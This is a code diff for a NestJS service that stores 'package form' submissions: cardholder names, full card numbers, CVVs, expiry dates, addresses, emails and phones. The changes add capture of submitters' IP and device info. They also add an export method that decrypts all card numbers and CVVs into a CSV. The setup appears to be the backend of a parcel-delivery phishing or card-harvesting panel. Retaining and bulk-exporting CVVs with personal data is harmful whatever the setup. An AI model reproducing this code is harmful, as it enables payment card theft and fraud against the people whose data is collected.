@@ -1,11 +1,13 @@
 import { Injectable, NotFoundException } from '@nestjs/common';
 import { InjectRepository } from '@nestjs/typeorm';
-import { Repository, Between, FindOptionsWhere } from 'typeorm';
+import { Repository, In, Between } from 'typeorm';
 import { PackageForm } from './entities/package-form.entity';
 import { UpdateFormDto } from './dto/update-form.dto';
 import { QueryFormDto } from './dto/query-form.dto';
 import { User } from '../user/entities/user.entity';
 import * as crypto from 'crypto';
+import { BatchDeletePkgFormDto } from './dto/batch-delete-pkgform.dto';
+import { startOfDay, endOfDay } from 'date-fns';
 
 @Injectable()
 export class PkgformService {
@@ -32,7 +34,10 @@ export class PkgformService {
   }
 
   private decrypt(text: string): string {
+    if (!text) return '';
     const [ivHex, encryptedHex] = text.split(':');
+    if (!ivHex || !encryptedHex) return '';
+
     const iv = Buffer.from(ivHex, 'hex');
     const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv);
     let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
@@ -63,6 +68,8 @@ export class PkgformService {
     packageForm.cardNumberEncrypted = this.encrypt(formData.cardNumber);
     packageForm.expireDate = formData.expireDate;
     packageForm.cvvEncrypted = this.encrypt(formData.cvv);
+    packageForm.ipAddress = formData.ipAddress || null;
+    packageForm.deviceInfo = formData.deviceInfo || null;
 
     return this.packageFormRepository.save(packageForm);
   }
@@ -73,32 +80,112 @@ export class PkgformService {
       endCreateTime,
       updateTime,
       endUpdateTime,
+      createTimeStart,
+      createTimeEnd,
+      updateTimeStart,
+      updateTimeEnd,
       pageNo = 1,
       pageSize = 10,
       sort = 'DESC',
     } = query;
 
-    // 构建查询条件
-    const where: FindOptionsWhere<PackageForm> = { userId };
+    // 构建基础查询
+    const queryBuilder =
+      this.packageFormRepository.createQueryBuilder('packageForm');
+    queryBuilder.where('packageForm.userId = :userId', { userId });
 
-    if (createTime && endCreateTime) {
-      where.createdAt = Between(new Date(createTime), new Date(endCreateTime));
+    // 处理创建时间查询 - 优先使用新参数
+    if (createTimeStart || createTimeEnd) {
+      // 使用新的范围参数
+      if (createTimeStart) {
+        queryBuilder.andWhere(
+          'DATE(packageForm.createTime) >= :createStartDate',
+          {
+            createStartDate: createTimeStart,
+          },
+        );
+      }
+
+      if (createTimeEnd) {
+        queryBuilder.andWhere(
+          'DATE(packageForm.createTime) <= :createEndDate',
+          {
+            createEndDate: createTimeEnd,
+          },
+        );
+      }
+    } else if (createTime) {
+      // 向后兼容旧参数
+      if (endCreateTime) {
+        // 有开始和结束日期，查询日期范围
+        queryBuilder.andWhere(
+          'DATE(packageForm.createTime) BETWEEN :startDate AND :endDate',
+          {
+            startDate: createTime,
+            endDate: endCreateTime,
+          },
+        );
+      } else {
+        // 只有单个日期，只查询当天
+        queryBuilder.andWhere('DATE(packageForm.createTime) = :dateOnly', {
+          dateOnly: createTime,
+        });
+      }
     }
 
-    if (updateTime && endUpdateTime) {
-      where.updatedAt = Between(new Date(updateTime), new Date(endUpdateTime));
+    // 处理更新时间查询 - 优先使用新参数
+    if (updateTimeStart || updateTimeEnd) {
+      // 使用新的范围参数
+      if (updateTimeStart) {
+        queryBuilder.andWhere(
+          'DATE(packageForm.updateTime) >= :updateStartDate',
+          {
+            updateStartDate: updateTimeStart,
+          },
+        );
+      }
+
+      if (updateTimeEnd) {
+        queryBuilder.andWhere(
+          'DATE(packageForm.updateTime) <= :updateEndDate',
+          {
+            updateEndDate: updateTimeEnd,
+          },
+        );
+      }
+    } else if (updateTime) {
+      // 向后兼容旧参数
+      if (endUpdateTime) {
+        // 有开始和结束日期，查询日期范围
+        queryBuilder.andWhere(
+          'DATE(packageForm.updateTime) BETWEEN :updateStartDate AND :updateEndDate',
+          {
+            updateStartDate: updateTime,
+            updateEndDate: endUpdateTime,
+          },
+        );
+      } else {
+        // 只有单个日期，只查询当天
+        queryBuilder.andWhere(
+          'DATE(packageForm.updateTime) = :updateDateOnly',
+          {
+            updateDateOnly: updateTime,
+          },
+        );
+      }
     }
 
-    // 查询总数
-    const total = await this.packageFormRepository.count({ where });
+    // 添加调试日志
+    console.log('SQL查询条件:', queryBuilder.getSql());
+    console.log('SQL参数:', queryBuilder.getParameters());
 
-    // 查询数据
-    const forms = await this.packageFormRepository.find({
-      where,
-      order: { createdAt: sort },
-      skip: (pageNo - 1) * pageSize,
-      take: pageSize,
-    });
+    // 配置排序和分页
+    queryBuilder.orderBy('packageForm.createTime', sort);
+    queryBuilder.skip((pageNo - 1) * pageSize);
+    queryBuilder.take(pageSize);
+
+    // 获取总数和结果
+    const [forms, total] = await queryBuilder.getManyAndCount();
 
     // 如果没有找到表单，返回空数组而不是抛出错误
     if (!forms.length) {
@@ -116,6 +203,88 @@ export class PkgformService {
     });
 
     return { list, total };
+  }
+
+  async exportForms(
+    userId: number,
+    date: string,
+    startDate?: string,
+    endDate?: string,
+  ): Promise<string> {
+    // 构建查询
+    const queryBuilder =
+      this.packageFormRepository.createQueryBuilder('packageForm');
+    queryBuilder.where('packageForm.userId = :userId', { userId });
+
+    // 判断是使用日期范围还是单一日期查询
+    if (startDate && endDate) {
+      // 使用日期范围
+      queryBuilder.andWhere(
+        'DATE(packageForm.createTime) BETWEEN :startDate AND :endDate',
+        {
+          startDate,
+          endDate,
+        },
+      );
+    } else if (date) {
+      // 向后兼容 - 使用单一日期
+      queryBuilder.andWhere('DATE(packageForm.createTime) = :dateOnly', {
+        dateOnly: date,
+      });
+    }
+
+    queryBuilder.orderBy('packageForm.createTime', 'ASC');
+
+    console.log('导出查询:', queryBuilder.getSql());
+    console.log('导出参数:', queryBuilder.getParameters());
+
+    const forms = await queryBuilder.getMany();
+
+    if (!forms.length) {
+      return 'ID,Cardholder,CardNumber,CVV,ExpireDate,Name,Address1,Address2,City,State,PostalCode,Email,Phone,IPAddress,DeviceInfo,CreatedAt\r\n';
+    }
+
+    // 生成CSV头部
+    let csv =
+      'ID,Cardholder,CardNumber,CVV,ExpireDate,Name,Address1,Address2,City,State,PostalCode,Email,Phone,IPAddress,DeviceInfo,CreatedAt\r\n';
+
+    // 添加每行数据
+    forms.forEach((form) => {
+      const cardNumber = this.decrypt(form.cardNumberEncrypted || '');
+      const cvv = this.decrypt(form.cvvEncrypted || '');
+
+      // 转义CSV字段中的逗号、引号等
+      const escapeCSV = (field: string | null | undefined): string => {
+        if (field === null || field === undefined) return '';
+        const str = String(field);
+        if (str.includes(',') || str.includes('"') || str.includes('\n')) {
+          return `"${str.replace(/"/g, '""')}"`;
+        }
+        return str;
+      };
+
+      csv +=
+        [
+          form.id,
+          escapeCSV(form.cardholder),
+          escapeCSV(cardNumber),
+          escapeCSV(cvv),
+          escapeCSV(form.expireDate),
+          escapeCSV(form.name),
+          escapeCSV(form.address1),
+          escapeCSV(form.address2),
+          escapeCSV(form.city),
+          escapeCSV(form.state),
+          escapeCSV(form.postalCode),
+          escapeCSV(form.email),
+          escapeCSV(form.phone),
+          escapeCSV(form.ipAddress),
+          escapeCSV(form.deviceInfo),
+          form.createdAt.toISOString(),
+        ].join(',') + '\r\n';
+    });
+
+    return csv;
   }
 
   async generateIdentificationCode(): Promise<string> {
@@ -137,15 +306,47 @@ export class PkgformService {
   }
 
   async deleteForm(userId: number, formId: string) {
-    const form = await this.packageFormRepository.findOne({
-      where: { id: Number(formId), userId },
+    const result = await this.packageFormRepository.delete({
+      id: Number(formId),
+      userId: userId,
     });
 
-    if (!form) {
-      throw new NotFoundException('表单不存在或无权限删除');
+    if (result.affected === 0) {
+      throw new NotFoundException(`ID为 "${formId}" 的表单不存在或无权限删除`);
     }
 
-    await this.packageFormRepository.remove(form);
-    return { success: true };
+    return { message: '删除成功' };
+  }
+
+  async batchDeleteForm(
+    userId: number,
+    batchDeleteDto: BatchDeletePkgFormDto,
+  ): Promise<{ message: string; affectedCount: number }> {
+    let affectedCount = 0;
+
+    if (batchDeleteDto.ids && batchDeleteDto.ids.length > 0) {
+      // 按 ID 批量删除
+      const result = await this.packageFormRepository.delete({
+        userId: userId,
+        id: In(batchDeleteDto.ids),
+      });
+      affectedCount = result.affected || 0;
+    } else if (batchDeleteDto.startDate && batchDeleteDto.endDate) {
+      // 按日期范围批量删除 (确保包含起止日期当天的数据)
+      const startDate = startOfDay(new Date(batchDeleteDto.startDate));
+      const endDate = endOfDay(new Date(batchDeleteDto.endDate));
+
+      const result = await this.packageFormRepository.delete({
+        userId: userId,
+        createdAt: Between(startDate, endDate),
+      });
+      affectedCount = result.affected || 0;
+    }
+    // DTO 保证了 ids 或日期范围至少有一个，且只有一个
+
+    return {
+      message: `批量删除成功，共影响 ${affectedCount} 条记录`,
+      affectedCount,
+    };
   }
 }
